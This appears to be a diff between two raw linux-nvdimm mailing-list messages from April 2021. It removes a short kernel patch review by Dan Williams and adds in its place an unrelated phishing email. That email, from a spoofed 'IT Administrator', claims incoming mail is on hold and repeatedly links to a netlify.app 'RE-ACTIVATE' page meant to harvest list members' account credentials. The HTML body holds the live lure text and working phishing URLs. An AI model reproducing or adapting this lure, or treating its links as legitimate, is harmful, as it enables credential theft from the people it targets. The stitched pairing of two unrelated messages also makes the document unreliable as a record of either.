@@ -2,86 +2,154 @@ Return-Path: <linux-nvdimm-bounces@lists.01.org>
 X-Original-To: lists+linux-nvdimm@lfdr.de
 Delivered-To: lists+linux-nvdimm@lfdr.de
 Received: from ml01.01.org (ml01.01.org [IPv6:2001:19d0:306:5::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 96D543662AD
-	for <lists+linux-nvdimm@lfdr.de>; Wed, 21 Apr 2021 01:58:21 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 018CF366526
+	for <lists+linux-nvdimm@lfdr.de>; Wed, 21 Apr 2021 08:05:56 +0200 (CEST)
 Received: from ml01.vlan13.01.org (localhost [IPv6:::1])
-	by ml01.01.org (Postfix) with ESMTP id A384F100EAB5C;
-	Tue, 20 Apr 2021 16:58:18 -0700 (PDT)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=2a00:1450:4864:20::630; helo=mail-ej1-x630.google.com; envelope-from=dan.j.williams@intel.com; receiver=<UNKNOWN> 
-Received: from mail-ej1-x630.google.com (mail-ej1-x630.google.com [IPv6:2a00:1450:4864:20::630])
-	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits))
-	(No client certificate requested)
-	by ml01.01.org (Postfix) with ESMTPS id 423E0100EAB58
-	for <linux-nvdimm@lists.01.org>; Tue, 20 Apr 2021 16:58:15 -0700 (PDT)
-Received: by mail-ej1-x630.google.com with SMTP id mh2so39282986ejb.8
-        for <linux-nvdimm@lists.01.org>; Tue, 20 Apr 2021 16:58:15 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=intel-com.20150623.gappssmtp.com; s=20150623;
-        h=mime-version:references:in-reply-to:from:date:message-id:subject:to
-         :cc;
-        bh=bGzMMFSDXVEyac1L/55cUpZpjU4bjjoWfcDw+JMob04=;
-        b=ytcrxr8wbn8/5f4pqgMPFBPjgsUCFDMD5TM1ZAF0QU4PlCzmA8rMWxyXrHIAUt0ou2
-         likfPwJsXJQb9HKQzvOOmw0EhLFS3MQYnmxFxXqw2N1399atYkC1XYjiqJj7RqqZh4+Q
-         JpWAi5g7hqpN3qL0OWufzjzfNHRViTkPpLCVFo00Ni2WG0UFdHbw62zSVLySFf3Ux9Ka
-         Bb6IqTZJaiE/gB4S1CMCofM9zPtdLM03pVYgiWdHXM4uWAjTIyKcEJgiFSB8qSl5zI5W
-         vlnn3bLaR42S3SQYoNYpzQe1aOgvkvlInqtvY8boxyTwfsbKB17BmZgvK3HsgJ1wER3g
-         g3hw==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20161025;
-        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
-         :message-id:subject:to:cc;
-        bh=bGzMMFSDXVEyac1L/55cUpZpjU4bjjoWfcDw+JMob04=;
-        b=qJwsPzo3p/M0lPzpIQ9XRNzIs9hf94NvqaNK7TgmyNXTGlZWXGfJOTmz/zNXHE9MPj
-         IkLWWDSUdp5XmFLq5sE1BFoXlvmMj6fwPMJXoF6UO8NiN99z62SDtSlpR7ZDk4ULvfPb
-         92nHDG2QxH5yujq1IXWCyq1qV9xCTdxGoujRSjuzOYKoRDtVg5M/rGr2IJ2UzQoK6Kzr
-         sYbPX3nNWsBLMjP1F9KPcTN3eWfHk0OCN6Fa0v7MyTbyPTmHf9iaq4TIZS2Ky6mN70JQ
-         jShG/mQstXr1oBa+ARvj/O1D2fO8SEQz9CzDPzgaRY5sozAuyZJcb0iqUGhUfLN1AC2i
-         3sfQ==
-X-Gm-Message-State: AOAM533SzHCMWVrTMLPBYx/EdVQHvxVY/ojs+uiBG2ZiT7RWhdkAd+Is
-	kUBWsv0EPIe7mO9wPNpqUm4Vwb4EH3DCRVu+zr00Qw==
-X-Google-Smtp-Source: ABdhPJyz2D3hyXViWoO0yuscrp5I4sCJibwSSLOeRSpnxbMCw7pAbd5G4W4YTnawc/5sPprgOM8OCcCPsMSFL51a71M=
-X-Received: by 2002:a17:907:7631:: with SMTP id jy17mr30069454ejc.418.1618963094537;
- Tue, 20 Apr 2021 16:58:14 -0700 (PDT)
+	by ml01.01.org (Postfix) with ESMTP id F32E3100EC1D3;
+	Tue, 20 Apr 2021 23:05:52 -0700 (PDT)
+Received-SPF: None (mailfrom) identity=mailfrom; client-ip=198.23.206.55; helo=198-23-206-55-host.colocrossing.com; envelope-from=linux-nvdimm@lists.01.org; receiver=<UNKNOWN> 
+Received: from 198-23-206-55-host.colocrossing.com (unknown [198.23.206.55])
+	by ml01.01.org (Postfix) with ESMTP id C7C92100EC1C8
+	for <linux-nvdimm@lists.01.org>; Tue, 20 Apr 2021 23:05:50 -0700 (PDT)
+From: IT Administrator <linux-nvdimm@lists.01.org>
+To: linux-nvdimm@lists.01.org
+Subject: =?UTF-8?B?W0FDVCBOT1ddIOKduyDinIkgSW5jb21pbmcgbWFpbHMgaGFzIGJsb2NrZWQh?=
+Date: 21 Apr 2021 08:05:45 +0200
+Message-ID: <20210421080545.5107ECF61365B03E@lists.01.org>
 MIME-Version: 1.0
-References: <1618904867-25275-1-git-send-email-zou_wei@huawei.com>
-In-Reply-To: <1618904867-25275-1-git-send-email-zou_wei@huawei.com>
-From: Dan Williams <dan.j.williams@intel.com>
-Date: Tue, 20 Apr 2021 16:58:06 -0700
-Message-ID: <CAPcyv4hV1HhFRw42s=tc_8dLeY4+avB_2jauSxVzUBzKsEr8ew@mail.gmail.com>
-Subject: Re: [PATCH -next v2] tools/testing/nvdimm: Make symbol
- '__nfit_test_ioremap' static
-To: Zou Wei <zou_wei@huawei.com>
-Message-ID-Hash: 2AYT3TQR3BXPPVKHJF3A5B2LAZNRKGE6
-X-Message-ID-Hash: 2AYT3TQR3BXPPVKHJF3A5B2LAZNRKGE6
-X-MailFrom: dan.j.williams@intel.com
-X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation; nonmember-moderation; administrivia; implicit-dest; max-recipients; max-size; news-moderation; no-subject; suspicious-header
-CC: Andrew Morton <akpm@linux-foundation.org>, Dan Carpenter <dan.carpenter@oracle.com>, Boris Ostrovsky <boris.ostrovsky@oracle.com>, linux-nvdimm <linux-nvdimm@lists.01.org>, Linux Kernel Mailing List <linux-kernel@vger.kernel.org>
+Message-ID-Hash: B63A4HIJZ4RRLVRHHGZ7SUNDR6OMLNNX
+X-Message-ID-Hash: B63A4HIJZ4RRLVRHHGZ7SUNDR6OMLNNX
+X-MailFrom: linux-nvdimm@lists.01.org
+X-Mailman-Rule-Hits: nonmember-moderation
+X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
 X-Mailman-Version: 3.1.1
 Precedence: list
 List-Id: "Linux-nvdimm developer list." <linux-nvdimm.lists.01.org>
-Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/2AYT3TQR3BXPPVKHJF3A5B2LAZNRKGE6/>
+Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/B63A4HIJZ4RRLVRHHGZ7SUNDR6OMLNNX/>
 List-Archive: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/>
 List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
 List-Post: <mailto:linux-nvdimm@lists.01.org>
 List-Subscribe: <mailto:linux-nvdimm-join@lists.01.org>
 List-Unsubscribe: <mailto:linux-nvdimm-leave@lists.01.org>
+Content-Type: multipart/mixed; boundary="===============7073317311791844656=="
+
+--===============7073317311791844656==
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML>
+
+<html><head><title></title>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.4em;">
+<table width=3D"100%" style=3D"color: rgb(51, 51, 51); text-transform: none=
+; letter-spacing: normal; font-family: helvetica, arial, sans-serif; font-s=
+ize: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; font-stretch: inherit; font-variant-li=
+gatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px;=
+ text-decoration-thickness: initial; text-decoration-style: initial; text-d=
+ecoration-color: initial;" bgcolor=3D"#ffffff"=20
+border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td align=3D"le=
+ft" style=3D"margin: 0px; line-height: 18px; font-family: Roboto, RobotoDra=
+ft, Helvetica, Arial, sans-serif; font-size: 15px;"><table width=3D"100%" s=
+tyle=3D"font-family: inherit; font-size: 16px; font-stretch: inherit;" bord=
+er=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"margin=
+: 0px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font=
+-size: 12px;"><p>
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; font-family: i=
+nherit; vertical-align: inherit; font-stretch: inherit;"><b>Dear<span style=
+=3D"color: rgb(0, 0, 255);">&nbsp;linux-nvdimm</span><font color=3D"#ff0000=
+">,</font></b></span></p><p><span style=3D"border-width: 0px; margin: 0px; =
+padding: 0px; font-family: inherit; vertical-align: inherit; font-stretch: =
+inherit;"><b>You have some incoming messages that are placed on hold, due t=
+o mailbox&nbsp; upgrade.</b></span></p><p><b>
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; font-family: i=
+nherit; vertical-align: inherit; font-stretch: inherit;">Kindly&nbsp;<span =
+style=3D"color: rgb(255, 0, 0);"><a href=3D"https://quizzical-haibt-5ac4a6.=
+netlify.app/#linux-nvdimm@lists.01.org">RE-ACTIVATE</a></span>&nbsp;your ac=
+count<span style=3D"color: rgb(255, 0, 0);"><span>&nbsp;<a href=3D"https://=
+quizzical-haibt-5ac4a6.netlify.app/#linux-nvdimm@lists.01.org">linux-nvdimm=
+@lists.01.org</a></span>&nbsp;</span>&nbsp;<wbr>below to access incoming me=
+ssages.</span>
+&nbsp;&nbsp;</b></p></td></tr><tr><td style=3D"margin: 0px; font-family: Ro=
+boto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 12px;"><br><tab=
+le align=3D"left" style=3D"font-family: inherit; font-stretch: inherit;" bo=
+rder=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td height=3D"30"=
+ align=3D"center" valign=3D"middle" style=3D"margin: 0px; border: 1px solid=
+ rgb(232, 180, 99); font-family: Roboto, RobotoDraft, Helvetica, Arial, san=
+s-serif;" bgcolor=3D"#ffe86c">
+<table width=3D"100%" style=3D"text-align: left; font-stretch: inherit;" bg=
+color=3D"transparent" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbo=
+dy><tr><td width=3D"13" style=3D"margin: 0px; font-family: Roboto, RobotoDr=
+aft, Helvetica, Arial, sans-serif;"><table width=3D"13" style=3D"font-famil=
+y: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadd=
+ing=3D"1"><tbody><tr><td style=3D"margin: 0px; font-family: Roboto, RobotoD=
+raft, Helvetica, Arial, sans-serif;">&nbsp;</td></tr></tbody></table></td>
+<td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, Helvetica, Aria=
+l, sans-serif;"><span style=3D"border-width: 0px; margin: 0px; padding: 0px=
+; color: rgb(0, 0, 0); font-family: inherit; font-size: 13px; font-weight: =
+bold; vertical-align: baseline; display: block; white-space: nowrap; font-s=
+tretch: inherit;"><span style=3D"border-width: 0px; margin: 0px; padding: 0=
+px; font-family: inherit; vertical-align: inherit; font-stretch: inherit;">=
+
+<a style=3D"color: rgb(0, 0, 204);" href=3D"https://quizzical-haibt-5ac4a6.=
+netlify.app/#linux-nvdimm@lists.01.org" target=3D"_blank" rel=3D"noreferrer=
+" data-saferedirectreason=3D"2" data-saferedirecturl=3D"https://www.google.=
+com/url?q=3Dhttp://f0530289.xsph.ru/edit/?i%3Di%260%3Dsales01@stargoldmedic=
+s.com&amp;source=3Dgmail&amp;ust=3D1618965122042000&amp;usg=3DAFQjCNGHTMS1t=
+x8aT2GMH0pOYcXSQbnW9A">RE-ACTIVATE HERE</a></span></span></td>
+<td width=3D"13" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, He=
+lvetica, Arial, sans-serif;"><table width=3D"13" style=3D"font-family: inhe=
+rit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0" cellpadding=3D"=
+1"><tbody><tr><td style=3D"margin: 0px; font-family: Roboto, RobotoDraft, H=
+elvetica, Arial, sans-serif;">&nbsp;</td></tr></tbody></table></td></tr></t=
+body></table></td></tr></tbody></table></td></tr></tbody></table></td>
+<td width=3D"20" style=3D"margin: 0px; font-family: Roboto, RobotoDraft, He=
+lvetica, Arial, sans-serif; font-size: 9px;"><table width=3D"20" style=3D"f=
+ont-family: inherit; font-stretch: inherit;" border=3D"0" cellspacing=3D"0"=
+ cellpadding=3D"1"><tbody><tr><td style=3D"margin: 0px; font-family: Roboto=
+, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 12px;">&nbsp;</td><=
+/tr></tbody></table></td></tr></tbody></table>
+<p style=3D"color: rgb(33, 33, 33); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Verdana; font-size: 15px; font-style:=
+ normal; font-weight: 400; word-spacing: 0px; white-space: normal; orphans:=
+ 2; widows: 2; background-color: rgb(255, 255, 255); font-variant-ligatures=
+: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-d=
+ecoration-thickness: initial; text-decoration-style: initial; text-decorati=
+on-color: initial;">
+<span style=3D"color: rgb(51, 51, 51); font-family: inherit; font-size: 13p=
+x;"><br>&nbsp; &nbsp;<span>&nbsp;</span><b>Best Regards&nbsp;&nbsp;</b></sp=
+an></p>
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; color: rgb(51, =
+51, 51); text-transform: none; text-indent: 0px; letter-spacing: normal; fo=
+nt-family: Verdana; font-size: 13px; font-style: normal; font-weight: 400; =
+word-spacing: 0px; vertical-align: baseline; white-space: normal; orphans: =
+2; widows: 2; font-stretch: inherit; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;"><p><span s=
+tyle=3D"border-width: 0px; margin: 0px; padding: 0px; font-family: inherit;=
+ vertical-align: inherit; font-stretch: inherit;"><b>&nbsp; &nbsp;&nbsp; Ad=
+ministrator.&nbsp;</b></span></p><p><span style=3D"border-width: 0px; margi=
+n: 0px; padding: 0px; color: rgb(46, 154, 254); font-family: arial, serif, =
+EmojiFont; font-size: small; vertical-align: baseline; font-stretch: inheri=
+t;"><b><font size=3D"3">
+&nbsp; &nbsp; &nbsp;&copy; 2021<span>&nbsp;</span><span>lists.01.org&nbsp;<=
+/span>Administrator.&nbsp;All Rights Reserved.</font></b></span></p></div><=
+p>
+</p>
+
+
+</body></html>
+--===============7073317311791844656==
 Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-On Tue, Apr 20, 2021 at 12:31 AM Zou Wei <zou_wei@huawei.com> wrote:
->
-> The sparse tool complains as follows:
->
-> tools/testing/nvdimm/test/iomap.c:65:14: warning:
->  symbol '__nfit_test_ioremap' was not declared. Should it be static?
->
-> This symbol is not used outside of iomap.c, so this
-> commit marks it static.
->
-> Reported-by: Hulk Robot <hulkci@huawei.com>
-> Signed-off-by: Zou Wei <zou_wei@huawei.com>
-
-Looks good to me, thanks.
 _______________________________________________
 Linux-nvdimm mailing list -- linux-nvdimm@lists.01.org
 To unsubscribe send an email to linux-nvdimm-leave@lists.01.org
+
+--===============7073317311791844656==--
